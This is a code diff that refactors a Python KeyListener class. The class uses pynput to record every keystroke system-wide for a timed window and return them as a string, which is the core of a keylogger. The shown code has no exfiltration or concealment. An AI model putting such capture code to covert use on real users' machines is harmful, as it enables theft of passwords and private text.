@@ -1,5 +1,6 @@
 import time
 
+from constants import TIME_OUT
 from pynput import keyboard
 
 
@@ -12,28 +13,26 @@ class KeyListener:
         self.keys = []
         self.listener = None
 
-    def on_press(self, key):
+    def on_press(self, key: keyboard.Key):
         """
         Adds the pressed key to the list of keys if it is a character key.
 
         Parameters:
             - key (Key): The key that was pressed.
         """
-        try:
-            cont = 0
-            if hasattr(key, 'char'):
-                self.keys.append(key.char)
-                cont += 1
-            elif hasattr(key, 'name') and key.name is not None:
-                self.keys.append(f'[{key.name.upper()}]')
-                cont += 1
 
-            # Space between keys to improve readability
-            if cont > 70:
-                self.keys.append('\n')
-                cont = 0
-        except AttributeError as e:
-            print(e)
+        cont = 0
+        if hasattr(key, 'char'):
+            self.keys.append(key.char)
+            cont += 1
+        elif hasattr(key, 'name') and key.name is not None:
+            self.keys.append(f'[{key.name.upper()}]')
+            cont += 1
+
+        # Space between keys to improve readability
+        if cont > 70:
+            self.keys.append('\n')
+            cont = 0
 
     def start_listener(self):
         """
@@ -48,7 +47,7 @@ class KeyListener:
         """
         self.listener.stop()
 
-    def read_keys(self, timeout=60):
+    def read_keys(self, timeout: float = TIME_OUT) -> str:
         """
         Reads the keys from the listener for a specified duration.
 
@@ -56,7 +55,7 @@ class KeyListener:
             - timeout (float): The duration in seconds to wait for keys.
         
         Returns:
-            - str: A string containing all the keys read from the listener.
+            - keys (str): A string containing all the keys read from the listener.
         """
         self.start_listener()
         time.sleep(timeout)
@@ -67,6 +66,6 @@ class KeyListener:
 
         return keys
 
-    def get_keys(self):
+    def get_keys(self) -> str:
         filtered_keys = [key for key in self.keys if key is not None]
         return ''.join(filtered_keys)
